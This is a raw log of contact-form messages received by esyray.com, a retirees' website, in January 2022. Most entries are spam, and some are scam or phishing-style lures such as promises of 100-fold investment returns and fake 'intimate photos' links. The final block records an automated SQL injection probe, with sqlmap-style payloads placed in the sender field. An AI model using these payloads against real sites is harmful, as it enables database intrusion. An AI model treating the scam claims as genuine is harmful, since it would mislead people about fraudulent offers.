Your content’s pretty good, wouldn’t change a thing.

BUT…

Eyeballs don’t pay the bills.

CUSTOMERS do.

And studies show that 7 out of 10 visitors to a site like esyray.com will drop by, take a gander, and then head for the hills without doing anything else.

It’s like they never were even there.

You can fix this.

You can make it super-simple for them to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket… thanks to Talk With Web Visitor.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know immediately – so you can talk to that lead immediately… without delay… BEFORE they head for those hills.
  
CLICK HERE http://jumboleadmagnet.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Now it’s also true that when reaching out to hot leads, you MUST act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s what makes our new SMS Text With Lead feature so powerful… you’ve got their phone number, so now you can start a text message (SMS) conversation with them… so even if they don’t take you up on your offer right away, you continue to text them new offers, new content, and new reasons to do business with you.

This could change everything for you and your business.

CLICK HERE http://jumboleadmagnet.com to learn more about everything Talk With Web Visitor can do and start turing eyeballs into money.

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Paying customers are out there waiting. 
Starting connecting today by CLICKING HERE http://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-01-06 06:59:28 PM -- Email from: Carina McGregor, -- subject: Ready To 10x The Number Of Customers?, -- email: mcgregor.carina98@msn.com, -- Message is: WhatDroid is a breakthrough automation and scheduling App for Whatsapp that makes marketing easy for small businesses and solopreneurs.

WhatDroid is the largest messaging application with more than 1.3 billion active users globally.

Unlike Email with a poor and decreasing open rate, WhatsApp messages are opened at the rate of over 98%. This is also backed by serious engagement.

https://marketingguru.sell.app/product/whatsapp-marketing
+++ 2022-01-06 11:42:34 PM -- Email from: Denis Velie, -- subject: Dallas Bodily, -- email: LelandPlaskett@gmail.com, -- Message is: Free submission of your new website to over 35 business directories here https://1mdr.short.gy/add-your-site
+++ 2022-01-07 01:52:27 AM -- Email from: Mike Harrison, -- subject: Get more dofollow backlinks for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
We all know the importance that dofollow link have on any website`s ranks. 
Having most of your linkbase filled with nofollow ones is of no good for your ranks and SEO metrics. 
 
Buy quality dofollow links from us, that will impact your ranks in a positive way 
https://www.digital-x-press.com/product/150-dofollow-backlinks/ 
 
Best regards 
Mike Harrison
 
support@digital-x-press.com
+++ 2022-01-07 09:09:41 AM -- Email from: CharlesBeIny, -- subject: Invest in profitable business, -- email: admin@captrade.ltd, -- Message is: Most reliable and trustworthy platform for investment 
No withdrawal fee/charges 
Instant and daily withdrawal 
24/7 online customer care service 
Use the link to sign up and start your investment journey with Captrade, very transparent and coordinated 
 
https://captrade.ltd
+++ 2022-01-08 05:59:08 PM -- Email from: 100X BANK, -- subject: Buy a $1B Bank With Only $500K, -- email: 100x@wtebank.com, -- Message is: You can buy a billion dollar bank with only $500K today. 100% of the work is done for you. Go to https://bit.ly/3eJYVsU to learn more. Richard Johnson
+++ 2022-01-08 05:59:28 PM -- Email from: 100X BANK, -- subject: The Best investment Opportunity for 2022, -- email: 100x@wtebank.com, -- Message is: {You can make a 100-fold return on investment within 90 days via the 100X investment bank platform at https://bit.ly/3z34tbn . For example, if you invest $500,000 in the 100X investment bank platform, you will make $50 million within 90 days. To learn more about the 100X investment bank platform, go to https://bit.ly/3z34tbn  now.
+++ 2022-01-08 10:52:01 PM -- Email from: Horny Shriya, -- subject: (2) Horny Shriya sent you messages, -- email: arlie.dymock@yahoo.com, -- Message is: Horny Shriya sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/HornyShriya/
+++ 2022-01-09 02:04:03 AM -- Email from: aspic, -- subject: I promised., -- email: v01tywbx@yahoo.com, -- Message is: Hi, this is Jeniffer. I am sending you my intimate photos as I promised. https://tinyurl.com/yye7tn5n
+++ 2022-01-09 07:11:51 AM -- Email from: Eric Jones, -- subject: Try this, get more leads, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, my name is Eric and I’m betting you’d like your website esyray.com to generate more leads.

Here’s how:
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you as soon as they say they’re interested – so that you can talk to that lead while they’re still there at esyray.com.

Talk With Web Visitor – CLICK HERE https://jumboleadmagnet.com for a live demo now.

And now that you’ve got their phone number, our new SMS Text With Lead feature enables you to start a text (SMS) conversation – answer questions, provide more info, and close a deal that way.

If they don’t take you up on your offer then, just follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE https://jumboleadmagnet.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Try Talk With Web Visitor and get more leads now.

Eric
PS: The studies show 7 out of 10 visitors don’t hang around – you can’t afford to lose them!
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-01-10 05:30:19 PM -- Email from: Eric Jones, -- subject: Why not TALK with your leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: My name’s Eric and I just found your site esyray.com.

It’s got a lot going for it, but here’s an idea to make it even MORE effective.

Talk With Web Visitor – CLICK HERE https://jumboleadmagnet.com for a live demo now.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

And once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation… and if they don’t take you up on your offer then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE https://jumboleadmagnet.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Eric
PS: Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment. Don’t keep losing them. 
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-01-10 09:25:07 PM -- Email from: Lawerence Mcdonough, -- subject: esyray.com shipping rates from China, -- email: pmtaking@163.com, -- Message is: Hi  esyray.com

We are the Top 100 freight forwarder in China,We can handle the shipment from Shenzhen, Guangzhou,Xiamen, Shanghai, Ningbo, Qingdao and so on.
 
 Here below is our main services:
1. Air freight&amp;Ocean freight forwarding
2. FBA shipping
3. Consolidation,Warehousing
4. Customs broker
5. Insurance
6. DDU&amp;DDP

some price for your reference:
China ports to the LA/West ports in the USA  :USD14000-17000/40HQ
China ports to the NY/East ports in the USA: USD17000-21000/40HQ
China ports to Australia Ports: USD8000-1100/40HQ
China ports to Europe Ports:USD12000-15000/40HQ
China ports to Latin America: USD12000-15000/40HQ

Would you like tell me which is your depart ports in China and which is your destination ports?We will offer the best price for you.


Thanks&amp;Best Regards,

Kroes     
pmtaking@163.com

-------------------------------------------
esyray.com
https://esyray.com/
E-Systems/Raytheon Garland Retirees
+++ 2022-01-11 07:01:41 PM -- Email from: aspic, -- subject: I promised., -- email: 1wo546wt@yahoo.com, -- Message is: Hi, this is Julia. I am sending you my intimate photos as I promised. https://tinyurl.com/yy3nre2w
+++ 2022-01-12 03:09:22 PM -- Email from: Jodie Ruppert, -- subject: Linwood Alexanian, -- email: SharmaineSebring@gmail.com, -- Message is: Free submission of your new website to over 1000 business directories here https://1mdr.short.gy/submityourwebsite
+++ 2022-01-12 03:45:07 PM -- Email from: Demi, -- subject: PawSafer™ E-Systems/Raytheon Garland Retirees, -- email: gladney.demi@gmail.com, -- Message is: PawSafer™ Can Safely Trim Your Dog'S Nails In No Time From Home.

Get it while it's still 50% OFF + FREE Shipping

Buy here: https://pawsafer.shop
 
All the best, 
 
Demi
+++ 2022-01-12 08:35:34 PM -- Email from: Jenny, -- subject: Best Ad Network For Publishers And Bloggers In 2021, -- email: jenny@foremedia.net, -- Message is: Hey, I visited your site and I think that your content is amazing! It is really engaging and original, you must have worked so hard to generate such a quality content. We are ForeMedia and we help website owners with great websites to maximize the revenue they make from their website. I would love to buy Ad Spaces on your website and pay you per each impression of the ads on your site. We are Google Ad Exchange Premium partners and we work with more than 100 Ad Network &amp; thousands of premium direct advertisers who would LOVE to buy Ads directly from your site and we can guarantee to increase your revenue by at least 45% compared to other advertising solutions you are currently using. You deserve to earn more for your content and maximize your earning potential and I will help you unlock that potential! There is no cost, you can register to our monetization platform for free on this link: https://foremedia.net/start I will be available for you on the Live Chat if you need any help, or you can email me back to: jenny@foremedia.net if you have any questions. I have at least 17 Premium Advertisers that have asked me to approach you because they would like to advertise on your website on Premium eCPM [cost per impressions] basis. Have a good day &amp; feel free to ping me for any question! Click the link here for 1 minute registration to our platform [it's free!]: https://go.foremedia.net/u/start/
+++ 2022-01-13 09:22:25 AM -- Email from: Mike Finch, -- subject: Increase sales for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Howdy 
 
If you'll ever need a permanent increase in your website's Domain Authority score, We can help. 
 
More info: 
https://www.strictlydigital.net/product/moz-da50-seo-plan/ 
 
 
Thank you 
Mike Finch
 
mike@strictlydigital.net
+++ 2022-01-13 04:47:01 PM -- Email from: Kate Morris, -- subject: RE: 25k interested people coming to your site, -- email: ts1@reallyfast.info, -- Message is: Hi,

I came across your site and thought our services may be of interest.

We are a leader in gettting the people you want to your business.

Would you like 25,000 interested people coming to your site in 14 days
coming to you from major online publications in your exact category?
You give final approval before start of your campaign.

Most popular package -  
25,000 interested people in a 14 time frame.
(national not segmented by city or state)
Both smaller and larger packages available.

We look forward to seeing you on our site to show what we can do for your business.

Kind regards,
Kate M.
https://traffic-stampede.com
+++ 2022-01-13 06:03:42 PM -- Email from: Shantell Timm, -- subject: Hi, -- email: timm.shantell@googlemail.com, -- Message is: Stay warm and cozy with a Wall Outlet Portable Space Heater.

https://bit.ly/3K7fNZi










or https://bit.ly/3fhszGn
+++ 2022-01-13 08:19:37 PM -- Email from: Ronald Carlile, -- subject: Social Targeted Traffic, -- email: ronald.carlile@googlemail.com, -- Message is: If you ever need more social audience for esyray.com, we can run Facebook Traffic campaigns with this service: https://www.seo-treff.de/product/country-targeted-traffic/
+++ 2022-01-15 01:36:12 AM -- Email from: Horny Shriya, -- subject: (2) Horny Shriya sent you messages, -- email: dunn.titus90@gmail.com, -- Message is: Horny Shriya sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/HornyShriya/
+++ 2022-01-15 08:36:35 AM -- Email from: Elise, -- subject: Best Offer for esyray.com, -- email: info@nicetoread.com, -- Message is: Good Morning 

Don't you hate carrying a big bulky backpack when you are only going out for the day? This high quality shoulder bag solves that problem. 
Carry enough without bogging yourself down! Perfect for that fishing trip or day hike!

50% OFF for the next 24 Hours ONLY + FREE Worldwide Shipping for a LIMITED time

Buy now: https://fashionbag.sale

Sincerely, 

Elise
+++ 2022-01-15 08:25:21 PM -- Email from: TimothyItary, -- subject: Passives Einkommen Vor 12700 EUR in der Woche, -- email: andreboy211297@hotmail.de, -- Message is: Deine Kollegen verdienen schon von 12600 EUR pro Tag &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fcaa7WZ&amp;sa=D&amp;99=00&amp;usg=AFQjCNHeDhPmQ6da3c_t6uxfxm4yAdThqw &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2022-01-16 06:35:52 AM -- Email from: Vania Kunkle, -- subject: Hey there https://www.esyray.com/contactUs.html, -- email: kunkle.vania@msn.com, -- Message is: Amazing portable fan heater for home or office.  50% discount applied.  Fast worldwide delivery.

https://bit.ly/3FDo4Ri
+++ 2022-01-16 12:19:11 PM -- Email from: Horny Shriya, -- subject: (2) Horny Shriya sent you messages, -- email: sharron.mccollum45@gmail.com, -- Message is: Horny Shriya sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/HornyShriya/
+++ 2022-01-17 03:22:30 AM -- Email from: WillardVah, -- subject: Anfangen zu verdienen von 17100 EUR pro Tag, -- email: xxdaniel12stylezxx@yahoo.de, -- Message is: Dies ist Ihre Chance zu verdienen von 19100 EUR pro Tag   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fcaa7WZ&amp;sa=D&amp;53=99&amp;usg=AFQjCNHeDhPmQ6da3c_t6uxfxm4yAdThqw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2022-01-17 06:38:15 PM -- Email from: Monica Cowles, -- subject: Lets get business rolling again, -- email: wasender99@gmail.com, -- Message is: Hey.

We know the pandemic has hit all companies hard and we are all recovering.

We want to help! We made our bulk WhatsApp Sender available for $5.

This offer is valid only for today (17 January 2022).

Lets get business rolling again.

You can view it here: https://cutt.ly/BulkSender

&quot;You can have a good product and bad marketing and fail or a bad product and good marketing and succeed&quot;
+++ 2022-01-18 04:37:19 AM -- Email from: Lynda Salas, -- subject: https://www.esyray.com/contactUs.html, -- email: lynda.salas@gmail.com, -- Message is: http://ssl2.42web.io/Lynda
+++ 2022-01-18 04:42:38 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2022-01-18 11:05:45 AM -- Email from: postingshgm, -- subject: Widespread online ads for organic growth of factors influencing consumer behaviour., -- email: tjurjutikovfeona1994@rambler.ru, -- Message is: Dear sir! 
 
 
Widespread placement of ads on the Internet for growth of factors influencing consumer behaviour. 
https://xn----ftbeand5abdikisgee.xn--p1ai/home/ 
 
Factors influencing consumer behaviour are certain actions of visitors on the website, such as: 
logging in to the internet resource, viewing pages, time spent on the website, “clicks” on links, repeated returns to the internet resource. 
 
UTO: 
Widespread placement of your ads online in order to attract potential customers. 
Growth of behavioural factors occurs by the widespread placement of your ads without specifying the address of your web page, but with the indication of other features identifying only your company according to which you currently become number one in the search engine results. These features can include a phone number, a unique name of the company or website, an identifier (a number, a product code, services, promotions), a physical address of the company and etc. 
 
AIM: 
The large-scale attraction of customers to your online resource, services and products. 
Organic growth of behavioural factors. 
 
YOUR BENEFIT: 
An increase in website visitors who will find your online resource directly from ads using search as well as through additional results of a search itself related to a the widest range of internet queries on your topic. 
 
THE MAIN ADVANTAGES OF THIS AD: 
1. Spread. 
2. High-speed placement. 
3. Cost. 
4. Placement by subject. 
5. Wide reach. 
6. Regionality. 
7. Growth of behavioural factors. 
 
REASONS TO ORDER MASS ADS PLACEMENT ONLINE ДЛЯ GROWTH OF FACTORS INFLUENCING CONSUMER BEHAVIOUR: 
 
1.Widespread attraction of potential customers to your products and services through direct traffic from ads. 
2.Organic promotion of your internet resource, due to search beginning to additionally show it for a large range of search browser queries based on your subject. 
3. The absence of &quot;bans&quot; and &quot;filters&quot; of search engines, due to ads being placed without an indication of an link to the online resource. 
4. An increase in web page traffic, which leads to an increase in orders and an expansion of the your customer base. 
5. &quot;Warm traffic&quot;, since only engaged users visit the web page. 
6. Attraction of legal entities and individuals. 
7. Analysis of demand for services and goods. 
8.Placement of your ads in different countries all over the world. 
 
WHERE ADS ARE PUBLISHED: 
 
Ads are placed:  on billboards, in guest books, in comments, in catalogues, on forums. 
Ads are placed on your: landing pages, YouTube videos, phones, websites, social media accounts, and on links to your other ads. 
 
SEARCH ENGINE SANCTIONS: 
In this type of ad a ban by search engine is not possible, since ads are published without specifying an link to the website. 
 
Working method: 
You send us the text of the ad, where your unique name and identifier is indicated at the end of the message, according to which an engaged visitor can quickly find your internet resource in search engine results in order to get further information about your service. 
To do this, a unique name or identifier must be published in the appropriate section of your web page и easily and quickly be found in results. 
 
 
Macros: 
Randomisation of ads is carried out according to the formula, which is accepted by many programs. As a result of randomisation, a lot of unique ads are obtained from one ad variant. 
 
This is achieved by manually synomising the ad text, while the meaning of the messages does not change and remains understandable. 
&lt;a href=https://xn----ftbeand5abdikisgee.xn--p1ai/home/&gt; 
 
Large-scale web ads for growth of factors influencing consumer behaviour.&lt;/a&gt;
+++ 2022-01-18 01:34:35 PM -- Email from: Eric Jones, -- subject: Turn Surf-Surf-Surf into Talk Talk Talk, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hello, my name’s Eric and I just ran across your website at esyray.com...

I found it after a quick search, so your SEO’s working out…

Content looks pretty good…

One thing’s missing though…

A QUICK, EASY way to connect with you NOW.

Because studies show that a web lead like me will only hang out a few seconds – 7 out of 10 disappear almost instantly, Surf Surf Surf… then gone forever.

I have the solution:

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to TALK with them - literally while they’re still on the web looking at your site.

CLICK HERE http://jumboleadmagnet.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works and even give it a try… it could be huge for your business.

Plus, now that you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation pronto… which is so powerful, because connecting with someone within the first 5 minutes is 100 times more effective than waiting 30 minutes or more later.

The new text messaging feature lets you follow up regularly with new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable.
 
CLICK HERE http://jumboleadmagnet.com to discover what Talk With Web Visitor can do for your business, potentially converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://jumboleadmagnet.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://jumboleadmagnet.com/unsubscribe.aspx?d=esyray.com
+++ 2022-01-18 05:53:00 PM -- Email from: Mike Arthurs, -- subject: Local SEO for more business, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
We will enhance your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our services below, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike Arthurs
 
Speed SEO Digital Agency
+++ 2022-01-20 12:57:34 AM -- Email from: Charissa Zahn, -- subject: esyray.com shipping rates from China, -- email: pmtaking@163.com, -- Message is: Hi  esyray.com

We are the Top 100 freight forwarder in China,We can handle the shipment from Shenzhen, Guangzhou,Xiamen, Shanghai, Ningbo, Qingdao and so on.
 
 Here below is our main services:
1. Air freight&amp;Ocean freight forwarding
2. FBA shipping
3. Consolidation,Warehousing
4. Customs broker
5. Insurance
6. DDU&amp;DDP

some price for your reference:
China ports to the LA/West ports in the USA  :USD115000-15000/40HQ
China ports to the NY/East ports in the USA: USD15000-20000/40HQ
China ports to Australia Ports: USD7000-8000/40HQ
China ports to Europe Ports:USD12000-13500/40HQ
China ports to Latin America: USD12000-14000/40HQ

Would you like tell me which is your depart ports in China and which is your destination ports?We will offer the best price for you.


Thanks&amp;Best Regards,

Kroes     
pmtaking@163.com

-------------------------------------------
esyray.com
https://esyray.com/
E-Systems/Raytheon Garland Retirees
+++ 2022-01-20 05:38:19 AM -- Email from: 1, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:20 AM -- Email from: 1, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:21 AM -- Email from: 2045, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:22 AM -- Email from: 1(,(''),'',, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:22 AM -- Email from: 1'NPPDJP&lt;'&quot;&gt;oealno, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:24 AM -- Email from: 1) AND 4087=2745 AND (1532=1532, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:25 AM -- Email from: 1) AND 1543=1543 AND (7484=7484, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:25 AM -- Email from: 1 AND 4282=2964, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:26 AM -- Email from: 1 AND 1543=1543, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:26 AM -- Email from: 1 AND 5759=8065-- UvIA, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:26 AM -- Email from: 1 AND 1543=1543-- PHrJ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:27 AM -- Email from: 1') AND 8599=3568 AND ('qpOD'='qpOD, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:27 AM -- Email from: 1') AND 1543=1543 AND ('JVUm'='JVUm, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:28 AM -- Email from: 1' AND 3613=9361 AND 'COyr'='COyr, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:28 AM -- Email from: 1' AND 1543=1543 AND 'zauo'='zauo, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:29 AM -- Email from: 1%' AND 1296=3260 AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:29 AM -- Email from: 1%' AND 1543=1543 AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:30 AM -- Email from: (SELECT (CASE WHEN (9401=9878) THEN 9401 ELSE 9401*(SELECT 9401 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:30 AM -- Email from: (SELECT (CASE WHEN (3931=3931) THEN 3931 ELSE 3931*(SELECT 3931 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:30 AM -- Email from: 1) AND (SELECT 5463 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5463=5463,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8166=8166, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:31 AM -- Email from: 1 AND (SELECT 5463 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5463=5463,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:31 AM -- Email from: 1 AND (SELECT 5463 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5463=5463,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- wdsd, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:32 AM -- Email from: 1') AND (SELECT 5463 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5463=5463,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('bwQD'='bwQD, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:32 AM -- Email from: 1' AND (SELECT 5463 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5463=5463,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'CpYJ'='CpYJ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:35 AM -- Email from: 1%' AND (SELECT 5463 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5463=5463,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:35 AM -- Email from: 1) AND 3188=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3188=3188) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND (5694=5694, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:36 AM -- Email from: 1 AND 3188=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3188=3188) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:36 AM -- Email from: 1 AND 3188=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3188=3188) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC)-- tezX, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:36 AM -- Email from: 1') AND 3188=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3188=3188) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND ('paOe'='paOe, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:37 AM -- Email from: 1' AND 3188=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3188=3188) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND 'DRNr'='DRNr, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:37 AM -- Email from: 1%' AND 3188=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3188=3188) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:38 AM -- Email from: 1) AND 7709=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7709=7709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND (3562=3562, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:38 AM -- Email from: 1 AND 7709=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7709=7709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:39 AM -- Email from: 1 AND 7709=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7709=7709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)))-- jJFP, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:39 AM -- Email from: 1') AND 7709=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7709=7709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND ('Jmyi'='Jmyi, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:39 AM -- Email from: 1' AND 7709=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7709=7709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND 'tCkP'='tCkP, -- subject: 1, -- email: 1, -- Message is: 
